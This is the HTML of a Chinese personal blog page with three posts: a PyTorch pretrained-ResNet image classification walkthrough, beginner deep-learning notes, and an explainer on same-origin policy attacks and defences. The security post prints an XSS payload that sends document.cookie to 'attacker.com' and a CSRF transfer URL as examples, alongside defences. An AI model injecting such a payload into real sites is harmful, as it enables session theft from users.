            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-04-15 22:00:14" itemprop="dateModified" datetime="2025-04-15T22:00:14+08:00">2025-04-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">深度学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="预训练神经网络"><a href="#预训练神经网络" class="headerlink" title="预训练神经网络"></a>预训练神经网络</h1><p>网络上有很多是已经经过数据集训练的微型ai，非常的有趣，我们可以把预先训练的神经网络看作是一个接受输入并生成输出的程序，该程序的行为是有神经网络的结构以及它在训练过程中所看到的例子决定的，即期望的输入-输出对，或者期望输出满足的特性，使用现成的模型是快速启动深度学习的一种方法，节省了很多的时间</p>
<h2 id="一个识别图像主体的预训练网络"><a href="#一个识别图像主体的预训练网络" class="headerlink" title="一个识别图像主体的预训练网络"></a>一个识别图像主体的预训练网络</h2><p>作为对深度学习的第一次尝试，一个非常先进的深度神经网络是非常有必要的，有许多预先训练过的网络都可以通过源代码库进行访问呢，我本次尝试的是一个在imagenet数据集上的子集训练过的，</p>
<p>具体来说，图像识别的任务包括获取一个输入图像，并从1000个类别中生成5个白哦前的列表，按可信度排序描述图像的内容</p>
<h3 id="获取一个预先训练好的网络"><a href="#获取一个预先训练好的网络" class="headerlink" title="获取一个预先训练好的网络"></a>获取一个预先训练好的网络</h3><p>我所使用的网络是从torchvision中获取的，该项目包含一些表现优异的，关于计算机视觉的神经网络架构，可以方便得访问数据集和其他工具，首先加载并运行两个网络，一个是AlexNet，它是在图像是被方面早期具有突破性得网络之一，然后是残差网络，简称ResNet</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In[1]</span><br><span class="line">from torchvision import models</span><br><span class="line">我们可以看看有多少模型</span><br><span class="line">print(dir(models))</span><br><span class="line"># Out[2]: [&#x27;AlexNet&#x27;,  &#x27;DenseNet&#x27;,  &#x27;Inception3&#x27;,  &#x27;ResNet&#x27;,  &#x27;SqueezeNet&#x27;,  &#x27;VGG&#x27;, ...  &#x27;alexnet&#x27;,  &#x27;densenet&#x27;,  &#x27;densenet121&#x27;, ...  &#x27;resnet&#x27;,  &#x27;resnet101&#x27;,  &#x27;resnet152&#x27;, ...  ] </span><br></pre></td></tr></table></figure>

<p><strong>AlexNet</strong></p>
<p>按照现在得标准，这是一个相当小得网络，但它非常适合着眼于神经网络，在AlexNet架构中，输入图像从左侧进入并且依次进入5个过滤器，每一个过滤器生成一些输出图像，经过每个过滤器后，图像会被缩小，在过滤器堆栈中，最后一个过滤器产生得图像被排列成一个拥有4096个元素得一维向量，并被分类以产生1000个输出，每个输出对应一个类</p>
<p>我们可以创建一个AlexNet类得实例，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alexnet = models.AlexNet()</span><br></pre></td></tr></table></figure>

<p>此时，alexnet是一个可运行得对象，可以像函数一样调用它</p>
<p><strong>ResNet</strong></p>
<p>现在创建一个网络实例，传递一个参数，指示函数下载resnet101在imagenet数据集上训练好得权重</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resnet = models.resnet101(pretrained=True) </span><br></pre></td></tr></table></figure>

<h3 id="准备运行"><a href="#准备运行" class="headerlink" title="准备运行"></a>准备运行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resnet</span><br></pre></td></tr></table></figure>

<p>再输入图像之前，我们必须要对输入得图像进行预处理，使其大小正确，torchvision模块提供了转换得操作，允许我们快速定义基本预处理函数得管道</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from torchvision import transforms </span><br><span class="line">preprocess = transforms.Compose([         </span><br><span class="line">transforms.Resize(256),         </span><br><span class="line">transforms.CenterCrop(224),         </span><br><span class="line">transforms.ToTensor(),         </span><br><span class="line">transforms.Normalize(             </span><br><span class="line">mean=[0.485, 0.456, 0.406],             </span><br><span class="line">std=[0.229, 0.224, 0.225]         </span><br><span class="line">)]) </span><br></pre></td></tr></table></figure>

<p>这个函数我解释一下，将输入得图像缩放到256x256个像素，围绕中心将图像裁剪为224x224个像素，并将其转化为一个张量，对其rgb分量进行归一化处理，使其具有定义得均值和标准差，张量是一种pytorch多维数组，然后我们就可以加载图像了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image </span><br><span class="line">img = Image.open(&quot;C:\\Users\\admin\\Pictures\\Camera Roll\\9C4F0A6EAC509071628AC3EF8D36CD8F.jpg&quot;) </span><br></pre></td></tr></table></figure>

<p>通过管道传递图像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img_t = preprocess(img) </span><br></pre></td></tr></table></figure>

<p>然后我们可以按照网络期望得方式对输入得张量进行重塑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import torch batch_t = torch.unsqueeze(img_t, 0) </span><br></pre></td></tr></table></figure>

<p>现在可以运行模型了</p>
<h3 id="运行模型"><a href="#运行模型" class="headerlink" title="运行模型"></a>运行模型</h3><p>为了进行推理，需要将网络置于eval模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resnet.eval()</span><br></pre></td></tr></table></figure>

<p>准备进行推理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">out = resnet(batch_t) </span><br><span class="line">out </span><br></pre></td></tr></table></figure>

<p>最终产生一个有1000个分数得向量，要查看预测标签得列表，我们需要架子啊一个文本文件，挑选出标签，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 如果您想自动下载标签文件</span><br><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># 检查是否已经有标签文件</span><br><span class="line">labels_path = &quot;e:\\code\\.idea\\pytorch\\imagenet_classes.txt&quot;</span><br><span class="line">if not os.path.exists(labels_path):</span><br><span class="line">    # 从GitHub下载标签文件</span><br><span class="line">    url = &quot;https://raw.githubusercontent.com/pytorch/hub/master/imagenet_classes.txt&quot;</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        with open(labels_path, &#x27;wb&#x27;) as f:</span><br><span class="line">            f.write(response.content)</span><br><span class="line">        print(f&quot;标签文件已下载到 &#123;labels_path&#125;&quot;)</span><br><span class="line">        # 读取下载的标签文件</span><br><span class="line">        with open(labels_path) as f:</span><br><span class="line">            labels = [line.strip() for line in f.readlines()]</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;无法下载标签文件，使用内置的部分标签&quot;)</span><br><span class="line">else:</span><br><span class="line">    # 读取已有的标签文件</span><br><span class="line">    with open(labels_path) as f:</span><br><span class="line">        labels = [line.strip() for line in f.readlines()]</span><br></pre></td></tr></table></figure>

<p>最后就直接输出结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 获取预测结果</span><br><span class="line">_, indices = torch.sort(out, descending=True)</span><br><span class="line">percentage = torch.nn.functional.softmax(out, dim=1)[0] * 100</span><br><span class="line">print(&quot;预测的前5个类别:&quot;)</span><br><span class="line">for idx in indices[0][:5]:</span><br><span class="line">    print(f&quot;&#123;labels[idx]&#125;: &#123;percentage[idx].item():.2f&#125;%&quot;)</span><br><span class="line">_, indices = torch.sort(out, descending=True)</span><br><span class="line">[(labels[idx],percentage[idx].item()) for idx in indices[0][:5]]</span><br></pre></td></tr></table></figure>

<p>输出结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wig: 14.47%</span><br><span class="line">stethoscope: 13.13%</span><br><span class="line">kimono: 10.52%</span><br><span class="line">hair slide: 10.51%</span><br><span class="line">academic gown: 5.38%</span><br></pre></td></tr></table></figure>

<p>识别结果如上，还是比较精准得吧</p>
<p>菜🐕初探神经网络</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/14/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E6%94%BB%E9%98%B2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Cnext">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="路漫漫其修远兮 吾将上下而求索">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/14/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E6%94%BB%E9%98%B2/" class="post-title-link" itemprop="url">同源策略攻防</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-14 23:05:44" itemprop="dateCreated datePublished" datetime="2025-04-14T23:05:44+08:00">2025-04-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-04-15 22:01:18" itemprop="dateModified" datetime="2025-04-15T22:01:18+08:00">2025-04-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="同源策略及其攻防详解"><a href="#同源策略及其攻防详解" class="headerlink" title="同源策略及其攻防详解"></a>同源策略及其攻防详解</h3><h4 id="1-同源策略的定义与作用"><a href="#1-同源策略的定义与作用" class="headerlink" title="1. 同源策略的定义与作用"></a>1. 同源策略的定义与作用</h4><p>同源策略是由Netscape提出的一种安全策略，用于限制不同源（协议、域名、端口）的文档或脚本如何与另一个源的资源进行交互。只有当协议、域名和端口完全相同时，才被认为是同源。</p>
<p><strong>作用</strong>：</p>
<ul>
<li>保护用户数据安全，防止不同源的脚本访问或修改当前页面的敏感数据。</li>
<li>防止敏感数据泄露，限制跨域请求。</li>
<li>防止跨站脚本攻击（XSS）和跨站请求伪造（CSRF）等安全威胁。</li>
</ul>
<h4 id="2-与同源策略相关的攻击"><a href="#2-与同源策略相关的攻击" class="headerlink" title="2. 与同源策略相关的攻击"></a>2. 与同源策略相关的攻击</h4><h5 id="（1）跨站脚本攻击（XSS）"><a href="#（1）跨站脚本攻击（XSS）" class="headerlink" title="（1）跨站脚本攻击（XSS）"></a>（1）跨站脚本攻击（XSS）</h5><p><strong>原理</strong>：攻击者通过注入恶意JavaScript代码，使其在用户浏览器中执行，窃取用户敏感信息或篡改页面内容。</p>
<p><strong>案例</strong>：<br>在一个论坛的留言板功能中，如果未对用户输入进行严格过滤，攻击者可以在留言框中输入以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location=&#x27;http://attacker.com?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>当其他用户访问该留言页面时，这段恶意脚本会被执行，将用户的cookie信息发送到攻击者的服务器。</p>
<p><strong>与同源策略的关系</strong>：XSS攻击利用网站漏洞，使得恶意脚本在同源页面中执行，绕过同源策略的限制。</p>
<h5 id="（2）跨站请求伪造（CSRF）"><a href="#（2）跨站请求伪造（CSRF）" class="headerlink" title="（2）跨站请求伪造（CSRF）"></a>（2）跨站请求伪造（CSRF）</h5><p><strong>原理</strong>：攻击者利用用户已登录的状态，伪造请求，执行未经授权的操作。</p>
<p><strong>案例</strong>：<br>假设银行网站的转账操作URL为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bank.com/transfer?to=123456&amp;amount=1000</span><br></pre></td></tr></table></figure>

<p>攻击者可以在一个恶意页面中创建一个隐藏的链接或按钮，链接指向上述URL。当用户在已登录银行网站的状态下访问该恶意页面并点击链接时，资金可能被转走。</p>
<p><strong>与同源策略的关系</strong>：CSRF攻击通过诱导用户点击恶意链接，绕过同源策略对跨域请求的部分限制。</p>
<h5 id="（3）点击劫持（Clickjacking）"><a href="#（3）点击劫持（Clickjacking）" class="headerlink" title="（3）点击劫持（Clickjacking）"></a>（3）点击劫持（Clickjacking）</h5><p><strong>原理</strong>：攻击者通过透明iframe等手段，诱导用户点击，执行恶意操作。</p>
<p><strong>案例</strong>：<br>在一个看似普通的图片页面中，攻击者可能隐藏一个透明的iframe，用户点击图片时，实际触发了iframe中的恶意链接。</p>
<p><strong>与同源策略的关系</strong>：点击劫持利用用户的视觉错觉，绕过同源策略对页面交互操作的限制。</p>
<h4 id="3-基于同源策略的防御措施"><a href="#3-基于同源策略的防御措施" class="headerlink" title="3. 基于同源策略的防御措施"></a>3. 基于同源策略的防御措施</h4><h5 id="（1）针对XSS攻击"><a href="#（1）针对XSS攻击" class="headerlink" title="（1）针对XSS攻击"></a>（1）针对XSS攻击</h5><ul>
<li><p><strong>HttpOnly属性</strong>：禁止JavaScript访问带有HttpOnly属性的cookie，防止cookie被XSS攻击窃取。例如，在服务器端设置cookie时使用以下代码（以PHP为例）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(&#x27;user_id&#x27;, $user_id, time() + 3600, &#x27;/&#x27;, &#x27;&#x27;, false, true);</span><br></pre></td></tr></table></figure>

<p>其中最后一个参数<code>true</code>表示设置了HttpOnly属性。</p>
</li>
<li><p><strong>输入输出检查</strong>：对用户输入进行严格过滤，对输出进行编码。例如，过滤掉特殊符号如<code>&lt;</code>、<code>&gt;</code>等，并在输出时将其编码为<code>&lt;</code>、<code>&gt;</code>。</p>
</li>
</ul>
<h5 id="（2）针对CSRF攻击"><a href="#（2）针对CSRF攻击" class="headerlink" title="（2）针对CSRF攻击"></a>（2）针对CSRF攻击</h5><ul>
<li><strong>验证码</strong>：增加用户操作的验证步骤，防止攻击者伪造请求。</li>
<li><strong>Referer检查</strong>：验证请求来源是否为同源，拒绝非同源请求。</li>
<li><strong>Token机制</strong>：在请求中加入随机Token，确保请求的合法性。</li>
</ul>
<h5 id="（3）针对点击劫持"><a href="#（3）针对点击劫持" class="headerlink" title="（3）针对点击劫持"></a>（3）针对点击劫持</h5><ul>
<li><strong>X-Frame-Options</strong>：通过HTTP头限制页面被嵌入iframe，防止点击劫持。</li>
<li><strong>禁止跨域iframe</strong>：通过JavaScript代码防止页面被嵌套在恶意iframe中。</li>
</ul>
<h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h4><p>同源策略是Web安全的重要基石，通过限制不同源之间的交互，有效保护用户数据和隐私。然而，攻击者可能利用漏洞绕过同源策略，因此开发者需要采取多种防御措施，如输入验证、输出编码、使用安全的Cookie属性等，以增强Web应用的安全性。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/14/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-1day/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Cnext">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="路漫漫其修远兮 吾将上下而求索">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/14/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-1day/" class="post-title-link" itemprop="url">深度学习-1day</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-14 23:04:31" itemprop="dateCreated datePublished" datetime="2025-04-14T23:04:31+08:00">2025-04-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-04-15 21:59:54" itemprop="dateModified" datetime="2025-04-15T21:59:54+08:00">2025-04-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">深度学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="深度学习和pytorch库简介"><a href="#深度学习和pytorch库简介" class="headerlink" title="深度学习和pytorch库简介"></a>深度学习和pytorch库简介</h1><p><strong>今天所学到的</strong>:</p>
<p>·了解到深度学习改变在机器学习中使用到的方法</p>
<p>·pytorch为何适用于深度学习</p>
<p>今天初识人工智能，这个定义其实是非常模糊的，机器实际上是无法做到真正的独立思考，在现如今发达的时代，模型执行以前这些只有人类才能完成的任务的能力是通过样本得来的，而不是人类通过编码将其变为规则</p>
<h2 id="深度学习的革命"><a href="#深度学习的革命" class="headerlink" title="深度学习的革命"></a>深度学习的革命</h2><p>在过去的10年中，被称之为机器学习的一类系统重度依赖于特征工程，特征工程包括提出正确的转换，以便下游算法能够完成任务。例如，为了在手写数字的图像中区分1和0，我们会利用一组过滤器来判断图像上的边缘方向，然后训练一个分类器，在给定边缘方向分布的情况下预测正确的数字。另一个有用的特征可能是封闭圆圈的数量，比如对于数字0和8，特别是对于有2个圈的数字8。</p>
<p>但是在深度学习中，完成的功能是在原始的数据中找到这样的表征，终点不在于手工制作这些特征，重点在于操作数学实体，去发现特征</p>
<p>我们需要一种方法来提取我们手头的所有数据。我们需要定义深度学习机。我们需要通过一种自动化的训练方法来获得有用的表征，并使机器产生预期的输出。让我们更详细地了解一下我们一直提到的训练问题。在训练期间，我们使用一个评判标准、一个模型输出的实值函数和一份参考数据，给模型的期望输出和实际输出之间的差异提供一个分数（通常分数越低越好）。训练包括通过逐步修改我们的深度学习机，甚至是在训练过程中没有看到的数据，从而使评判标准的分数越来越低，直到它获得较低的分数。</p>
<h2 id="为何使用pytorch"><a href="#为何使用pytorch" class="headerlink" title="为何使用pytorch"></a>为何使用pytorch</h2><p>pytorch使用gpu进行加速计算，速度更快，并且它还提供了支持数学表达式数值优化的工具，用于训练深度学习模型，也可以称之为为科学计算提供优化支持的高性能库，我们需要一种方法来提取我们手头的所有数据。我们需要定义深度学习机。我们需要通过一种自动化的训练方法来获得有用的表征，并使机器产生预期的输出。让我们更详细地了解一下我们一直提到的训练问题。在训练期间，我们使用一个评判标准、一个模型输出的实值函数和一份参考数据，给模型的期望输出和实际输出之间的差异提供一个分数（通常分数越低越好）。训练包括通过逐步修改我们的深度学习机，甚至是在训练过程中没有看到的数据，从而使评判标准的分数越来越低，直到它获得较低的分数。</p>
<p>其中张量是pytorch中比较重要的一个概念</p>
<p>用于构建神经网络的PyTorch核心模块位于torch.nn中，它提供了通用的神经网络层和其他架构组件。全连接层、卷积层、激活函数和损失函数都可以在这里找到，这些组件可用于构建和初始化未训练的模型。为了训练模型，我们需要一些额外的东西：模型训练的数据源、一个使模型适应训练数据的优化器，以及一种把模型和数据传输到硬件的方法，该硬件用于执行模型训练所需的计算。</p>
<p>菜🐕的笔记</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Cnext</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">17</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/admintor889" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;admintor889" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Cnext</span>
</div>

<!--
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>-->

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
